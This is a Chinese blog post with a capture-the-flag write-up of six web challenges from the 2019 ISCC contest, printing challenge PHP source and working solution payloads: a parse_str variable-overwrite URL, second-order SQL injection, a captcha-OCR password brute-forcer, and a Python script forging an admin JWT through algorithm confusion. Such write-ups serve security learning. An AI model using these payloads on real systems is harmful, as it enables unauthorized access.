<!DOCTYPE html><html class="has-navbar-fixed-top" lang="zh-cmn-Hans"><head><meta charset="utf-8"><title>2019 ISCC Web wp - Zedd&#39;s Blog</title><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="description" content="ZeddYu's Blog"><meta name="description" content="2019 ISCC Web wp，没什么太大意义…原题比较多…没学到啥…"><meta property="og:type" content="article"><meta property="og:title" content="2019 ISCC Web wp"><meta property="og:url" content="https://blog.zeddyu.info/2019/05/30/2019iscc/index.html"><meta property="og:site_name" content="Zedd&#39;s Blog"><meta property="og:description" content="2019 ISCC Web wp，没什么太大意义…原题比较多…没学到啥…"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2019-05-30T10:41:10.000Z"><meta property="article:modified_time" content="2021-09-27T17:45:58.716Z"><meta property="article:author" content="Zedd"><meta property="article:tag" content="wp"><meta property="article:tag" content="CTF"><meta name="twitter:card" content="summary"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.8.1/css/bulma.min.css"><script defer="defer" src="https://at.alicdn.com/t/font_1780077_0ad2sbnz4nz.js"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="/css/style.css"><script>window.ga_tid="UA-112937997-1",window.ga_api="https://blog.zeddyu.info/ga_api/*"</script><script src="https://cdn.jsdelivr.net/npm/cfga@1.0.3" async></script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Zedd's Blog" type="application/atom+xml"></head><body><nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation"><div class="container"><div class="navbar-brand"><div class="navbar-item navbar-logo"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://s.gravatar.com/avatar/204a0c779acdb62f9084826396f6dccb?s=80" alt="" height="28"></div><div class="navbar-burger"><span></span><span></span><span></span></div></div><div class="navbar-menu navbar-start"> <a class="navbar-item" href="/">Index</a> <a class="navbar-item" href="/archives">Archives</a> <a class="navbar-item" href="/categories">Categories</a> <a class="navbar-item" href="/tags">Tags</a> <a class="navbar-item" href="/friends">Friends</a> <a class="navbar-item" href="/about">About</a> <a class="navbar-item" href="/advertisement">Ads</a></div><div class="navbar-menu navbar-end"> <a class="navbar-item search" title="Search" href="javascript:;"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-sousuo"></use></svg></a><div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc"> <a class="navbar-item" title="Table of Contents"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-list"></use></svg></a><div class="navbar-dropdown is-right"> <a class="navbar-item" href="#Web">1&nbsp;&nbsp;<b>Web</b></a> <a class="navbar-item" href="#Web1">1.1&nbsp;&nbsp;Web1</a> <a class="navbar-item" href="#Web2">1.2&nbsp;&nbsp;Web2</a> <a class="navbar-item" href="#Web3">1.3&nbsp;&nbsp;Web3</a> <a class="navbar-item" href="#Web4">1.4&nbsp;&nbsp;Web4</a> <a class="navbar-item" href="#Web5">1.5&nbsp;&nbsp;Web5</a> <a class="navbar-item" href="#Web6">1.6&nbsp;&nbsp;Web6</a></div></div> <a class="navbar-item" title="GitHub" href="https://github.com/ZeddYu" target="_blank" rel="noopener"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-github"></use></svg></a> <a class="navbar-item" title="Twitter" href="https://twitter.com/ZeddYu_Lu" target="_blank" rel="noopener"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-twitter"></use></svg></a> <a class="navbar-item" title="RSS" href="https://blog.zeddyu.info/atom.xml"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-rss"></use></svg></a></div></div></nav><section class="section"><div class="container"><article class="article content gallery" itemscope itemprop="blogPost"><h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name"> 2019 ISCC Web wp</h1><div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile"> <span class="column is-narrow"><span>May 30 2019</span> <span class="second-date-block">(<time datetime="2019-05-30T10:41:10.000Z" itemprop="datePublished">May 30 2019</time>)</span></span> <span class="column is-narrow article-category"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-folder"></use></svg><a class="article-category-link" href="/categories/CTF/">CTF</a></span> <span class="column is-narrow"><svg class="iconfont" aria-hidden="true"><use xlink:href="#icon-shalou"></use></svg> <span class="article-category-link">8 minutes read (About 1167 words)</span></span></div><div class="article-entry is-size-6-mobile" itemprop="articleBody"><ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Web"><span class="post-toc-number">1.</span> <span class="post-toc-text">Web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Web1"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">Web1</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Web2"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">Web2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Web3"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">Web3</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Web4"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">Web4</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Web5"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">Web5</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Web6"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">Web6</span></a></li></ol></li></ol><html><head></head><body><p>2019 ISCC Web wp，没什么太大意义…原题比较多…没学到啥…</p><a id="more"></a><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="hljs-meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="hljs-number">0</span>);</span><br><span class="line"><span class="hljs-keyword">require</span> <span class="hljs-string">'flag.php'</span>;</span><br><span class="line">$value = $_GET[<span class="hljs-string">'value'</span>];</span><br><span class="line">$password = $_GET[<span class="hljs-string">'password'</span>];</span><br><span class="line">$username = <span class="hljs-string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> ($i = <span class="hljs-number">0</span>; $i &lt; count($value); ++$i) {</span><br><span class="line">    <span class="hljs-keyword">if</span> ($value[$i] &gt; <span class="hljs-number">32</span> &amp;&amp; $value[$i] &lt; <span class="hljs-number">127</span>) <span class="hljs-keyword">unset</span>($value);</span><br><span class="line">    <span class="hljs-keyword">else</span> $username .= chr($value[$i]);</span><br><span class="line">    <span class="hljs-keyword">if</span> ($username == <span class="hljs-string">'w3lc0me_To_ISCC2019'</span> &amp;&amp; intval($password) &lt; <span class="hljs-number">2333</span> &amp;&amp; intval($password + <span class="hljs-number">1</span>) &gt; <span class="hljs-number">2333</span>) {</span><br><span class="line">        <span class="hljs-keyword">echo</span> <span class="hljs-string">'Hello '</span>.$username.<span class="hljs-string">'!'</span>, <span class="hljs-string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">        <span class="hljs-keyword">echo</span> $flag, <span class="hljs-string">'&lt;hr&gt;'</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="hljs-keyword">__FILE__</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p></p><figure class="highlight pgsql hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="hljs-number">39.100</span><span class="hljs-number">.83</span><span class="hljs-number">.188</span>:<span class="hljs-number">8001</span>/?<span class="hljs-keyword">value</span>[]=<span class="hljs-number">375</span>&amp;<span class="hljs-keyword">value</span>[]=<span class="hljs-number">307</span>&amp;<span class="hljs-keyword">value</span>[]=<span class="hljs-number">364</span>&amp;<span class="hljs-keyword">value</span>[]=<span class="hljs-number">355</span>&amp;<span class="hljs-keyword">value</span>[]=<span class="hljs-number">304</span>&amp;<span class="hljs-keyword">value</span>[]=<span class="hljs-number">365</span>&amp;<span class="hljs-keyword">value</span>[]=<span class="hljs-number">357</span>&amp;<span class="hljs-keyword">value</span>[]=<span class="hljs-number">351</span>&amp;<span class="hljs-keyword">value</span>[]=<span class="hljs-number">340</span>&amp;<span class="hljs-keyword">value</span>[]=<span class="hljs-number">367</span>&amp;<span class="hljs-keyword">value</span>[]=<span class="hljs-number">351</span>&amp;<span class="hljs-keyword">value</span>[]=<span class="hljs-number">329</span>&amp;<span class="hljs-keyword">value</span>[]=<span class="hljs-number">339</span>&amp;<span class="hljs-keyword">value</span>[]=<span class="hljs-number">323</span>&amp;<span class="hljs-keyword">value</span>[]=<span class="hljs-number">323</span>&amp;<span class="hljs-keyword">value</span>[]=<span class="hljs-number">306</span>&amp;<span class="hljs-keyword">value</span>[]=<span class="hljs-number">304</span>&amp;<span class="hljs-keyword">value</span>[]=<span class="hljs-number">305</span>&amp;<span class="hljs-keyword">value</span>[]=<span class="hljs-number">313</span>&amp;<span class="hljs-keyword">password</span>=<span class="hljs-number">2332e1</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p>提示<code>破解3位数字密码</code>，可以写脚本来跑，由于他的验证码是每次 GET 一次就刷一次，验证码处理这块会比较麻烦，学习了一波验证码的处理识别与 selenuim 爬虫的知识，写了个半成品，但是貌似这个处理 response 不太好处理，最后盲猜 996 拿到 flag</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> pytesseract</span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"><span class="hljs-keyword">import</span> time</span><br><span class="line"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image</span><br><span class="line"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver</span><br><span class="line"><span class="hljs-string">'''</span></span><br><span class="line"><span class="hljs-string">调用接口请求验证码，保存到本地，识别验证，检查识别的验证码对不对。</span></span><br><span class="line"><span class="hljs-string">'''</span></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(<span class="hljs-string">"http://39.100.83.188:8002/"</span>)</span><br><span class="line">driver.add_cookie({</span><br><span class="line"><span class="hljs-string">'domain'</span>: <span class="hljs-string">'39.100.83.188:8002'</span>,</span><br><span class="line"><span class="hljs-string">'name'</span>: <span class="hljs-string">'PHPSESSID'</span>,</span><br><span class="line"><span class="hljs-string">'value'</span>: <span class="hljs-string">'alsrko26h2mlbmkgv54r4gpcf3'</span>,</span><br><span class="line"><span class="hljs-string">'path'</span>: <span class="hljs-string">'/'</span>,</span><br><span class="line"><span class="hljs-string">'expires'</span>: <span class="hljs-literal">None</span></span><br><span class="line">})</span><br><span class="line">driver.get(<span class="hljs-string">"http://39.100.83.188:8002/"</span>)</span><br><span class="line"><span class="hljs-comment"># 比较好理解、截图并保存到这个路径</span></span><br><span class="line">driver.get_screenshot_as_file(<span class="hljs-string">'./screenshoot.png'</span>)</span><br><span class="line"><span class="hljs-comment"># driver.close()</span></span><br><span class="line"><span class="hljs-comment"># 打开刚刚保存的图片</span></span><br><span class="line">im = Image.open(<span class="hljs-string">'./screenshoot.png'</span>)</span><br><span class="line"><span class="hljs-comment"># 设置要裁剪的区域（验证码所在的区域）</span></span><br><span class="line">box = (<span class="hljs-number">0</span>, <span class="hljs-number">200</span>, <span class="hljs-number">130</span>, <span class="hljs-number">300</span>)</span><br><span class="line"><span class="hljs-comment"># 截图，生成只有验证码的图片</span></span><br><span class="line">region = im.crop(box)</span><br><span class="line"><span class="hljs-comment"># 保存到本地路径</span></span><br><span class="line">region.save(<span class="hljs-string">"./code.png"</span>)</span><br><span class="line"><span class="hljs-comment"># 读取验证码图片</span></span><br><span class="line">image = Image.open(<span class="hljs-string">"./code.png"</span>)</span><br><span class="line"><span class="hljs-comment"># 开始识别验证码</span></span><br><span class="line">optCode = pytesseract.image_to_string(image)</span><br><span class="line"><span class="hljs-comment"># 打印出验证码</span></span><br><span class="line">print(<span class="hljs-string">"验证码："</span>, optCode)</span><br><span class="line">password = <span class="hljs-string">'999'</span></span><br><span class="line">driver.find_element_by_name(<span class="hljs-string">"pwd"</span>).send_keys(password)</span><br><span class="line">driver.find_element_by_name(<span class="hljs-string">"user_code"</span>).send_keys(optCode)</span><br><span class="line">driver.find_element_by_name(<span class="hljs-string">"Login"</span>).click()</span><br><span class="line">print(driver)</span><br></pre></td></tr></tbody></table></figure><p></p><p>后来看其他师傅，可以把 cookie 删掉来达到爆破密码</p><h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p>感觉是把 sql-lab 二次注入的题目给拿了上来，就是利用注册<code>admin'#</code>来更改管理员账号密码的那个题</p><p>但是貌似过滤了一些字符，但是管他么多，师傅们都是懒的，直接用<code>admin/123456</code>上去拿到 flag</p><p>看了其他师傅的wp，可以通过<code>admin'--xx</code>来二次注入，奇怪的是当时我并没有成功…可能并发确实太多了…</p><h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><p>代码审计题</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="hljs-meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="hljs-number">0</span>);</span><br><span class="line"><span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);</span><br><span class="line">$hashed_key = <span class="hljs-string">'ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a'</span>;</span><br><span class="line">$parsed = parse_url($_SERVER[<span class="hljs-string">'REQUEST_URI'</span>]);</span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($parsed[<span class="hljs-string">"query"</span>])){</span><br><span class="line">    $query = $parsed[<span class="hljs-string">"query"</span>];</span><br><span class="line">    $parsed_query = parse_str($query);</span><br><span class="line">    <span class="hljs-keyword">if</span>($parsed_query!=<span class="hljs-keyword">NULL</span>){</span><br><span class="line">        $action = $parsed_query[<span class="hljs-string">'action'</span>];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span>($action===<span class="hljs-string">"auth"</span>){</span><br><span class="line">        $key = $_GET[<span class="hljs-string">"key"</span>];</span><br><span class="line">        $hashed_input = hash(<span class="hljs-string">'sha256'</span>, $key);</span><br><span class="line">        <span class="hljs-keyword">if</span>($hashed_input!==$hashed_key){</span><br><span class="line">            <span class="hljs-keyword">die</span>(<span class="hljs-string">"&lt;img src='cxk.jpg'&gt;"</span>);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">echo</span> $flag;</span><br><span class="line">    }</span><br><span class="line">}<span class="hljs-keyword">else</span>{</span><br><span class="line">    show_source(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="line">}<span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>又是一个原题，利用<code>pase_str</code>函数的特性：</p><blockquote class="colorquote success"><p>parse_str ( string $encoded_string [, array &amp;$result ] ) : void</p><p>如果 encoded_string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。</p></blockquote><p>传入<code>hashed_key</code>覆盖掉<code>hased_key</code>即可</p><p>Payload:</p><p></p><figure class="highlight llvm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=auth&amp;key=test&amp;hashed_key=<span class="hljs-number">9</span>f<span class="hljs-number">86</span>d<span class="hljs-number">081884</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>d<span class="hljs-number">659</span>a<span class="hljs-number">2</span>feaa<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">55</span>ad<span class="hljs-number">015</span>a<span class="hljs-number">3</span>bf<span class="hljs-number">4</span>f<span class="hljs-number">1</span>b<span class="hljs-number">2</span>b<span class="hljs-number">0</span>b<span class="hljs-number">822</span>cd<span class="hljs-number">15</span>d<span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">15</span>b<span class="hljs-number">0</span>f<span class="hljs-number">00</span>a<span class="hljs-number">08</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><p><a href="http://39.100.83.188:8054/" target="_blank" rel="noopener">http://39.100.83.188:8054/</a></p><p>脑洞题…脑洞对不上…</p><p>参考<a href="https://www.anquanke.com/post/id/179216#h3-18" target="_blank" rel="noopener">2019iscc wp</a>，考点是注入，过滤了圆括号，注释符，from等等</p><p>payload ：order by 排序盲注</p><h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><p><a href="http://39.100.83.188:8053/" target="_blank" rel="noopener">http://39.100.83.188:8053/</a></p><p>测试发现一些特殊符号被转义</p><p></p><figure class="highlight dust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-xml">!@#$%^<span class="hljs-symbol">&amp;amp;</span>*()_+-=</span><span class="hljs-template-variable">{}</span><span class="hljs-xml">|[]\\:\";'<span class="hljs-symbol">&amp;lt;</span><span class="hljs-symbol">&amp;gt;</span>?,./</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>然后发现并没有什么用…</p><p>然后发现有 jwt ，但是看了一下并没什么，参考了<a href="https://xz.aliyun.com/t/2338" target="_blank" rel="noopener">JSON Web Token (JWT) 攻击技巧</a>，试了几种方式，改加密算法为 none 没用，又没有公钥…</p><p>然后终于在 <a href="http://39.100.83.188:8053/static/js/common.js" target="_blank" rel="noopener">http://39.100.83.188:8053/static/js/common.js</a> 中发现了</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getpubkey</span>(<span class="hljs-params"></span>)</span>{</span><br><span class="line">    <span class="hljs-comment">/* </span></span><br><span class="line"><span class="hljs-comment">    get the pubkey for test</span></span><br><span class="line"><span class="hljs-comment">    /pubkey/{md5(username+password)}</span></span><br><span class="line"><span class="hljs-comment">    */</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>这个没有用到的函数，还以为公钥是用<code>md5(username+password)</code>，结果发现这是个 url …</p><p>访问 <a href="http://39.100.83.188:8053/pubkey/9af8bd54cb8f00ac47d6050c99a5494b" target="_blank" rel="noopener">http://39.100.83.188:8053/pubkey/9af8bd54cb8f00ac47d6050c99a5494b</a> 得到</p><p></p><figure class="highlight json hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{<span class="hljs-attr">"pubkey"</span>:<span class="hljs-string">"-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\nIC+LX+9V/mpyKe9R3wIDAQAB\n-----END PUBLIC KEY-----"</span>,<span class="hljs-attr">"result"</span>:<span class="hljs-literal">true</span>}</span><br></pre></td></tr></tbody></table></figure><p></p><p>拿上面那篇先知文章的 exp 出来改一下</p><p></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">public = <span class="hljs-string">'''-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\nIC+LX+9V/mpyKe9R3wIDAQAB\n-----END PUBLIC KEY-----'''</span></span><br><span class="line"><span class="hljs-keyword">print</span> public</span><br><span class="line"><span class="hljs-keyword">print</span> jwt.encode({<span class="hljs-string">"name"</span>:<span class="hljs-string">"zeddy"</span>,<span class="hljs-string">"priv"</span>:<span class="hljs-string">"admin"</span>}, key=public, algorithm=<span class="hljs-string">'HS256'</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里注意，如果要用这个 exp 必须得用<code>pyjwt==0.4.3</code>，而且 python 还有个库也叫 jwt …这里需要用 python2 把两个<code>jwt/PyJWT</code>都卸了，然后装上面那个就行了。</p><p>用这个 jwt 访问<code>/list</code>就可以得到 admin 的 pastebin 了，访问即是 flag</p><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this)</script></body></html></div><div class="columns is-variable is-1 